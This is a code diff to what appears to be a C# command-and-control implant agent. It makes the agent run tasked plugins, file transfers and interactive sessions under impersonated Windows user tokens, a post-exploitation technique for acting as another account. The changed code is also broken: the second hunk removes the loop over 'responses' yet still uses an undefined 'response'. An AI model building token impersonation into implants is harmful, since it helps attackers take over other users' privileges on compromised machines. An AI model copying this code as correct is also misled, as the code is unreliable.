@@ -1,6 +1,7 @@
 ﻿using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
+using System.Security.Principal;
 using System.Text.Json;
 
 namespace Agent.Managers
@@ -58,7 +59,18 @@ namespace Agent.Managers
 
                     if (this.assemblyManager.TryGetPlugin(job.task.command, out plug))
                     {
-                        plug.Execute(job);
+                        if (job.task.token != 0 && OperatingSystem.IsWindows())
+                        {
+                            await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
+                            {
+                                plug.Execute(job);
+                            });
+                        }
+                        else
+                        {
+                            plug.Execute(job);
+                        }
+                            
                     }
                     else
                     {
@@ -86,7 +98,17 @@ namespace Agent.Managers
 
                 if (this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
                 {
-                    responses.ForEach(response => plugin.HandleNextMessage(response));
+                    if (job.task.token > 0 && OperatingSystem.IsWindows())
+                    {
+                        await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
+                        {
+                            plugin.HandleNextMessage(response);
+                        });
+                    }
+                    else
+                    {
+                        plugin.HandleNextMessage(response);
+                    }
                 }
             });
         }
@@ -123,7 +145,17 @@ namespace Agent.Managers
 
                 if (this.assemblyManager.TryGetPlugin<IInteractivePlugin>(job.task.command, out var plugin))
                 {
-                    plugin.Interact(response);
+                    if (job.task.token > 0 && OperatingSystem.IsWindows())
+                    {
+                        await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
+                        {
+                            plugin.Interact(response);
+                        });
+                    }
+                    else
+                    {
+                        plugin.Interact(response);
+                    }
                 }
             });
         }
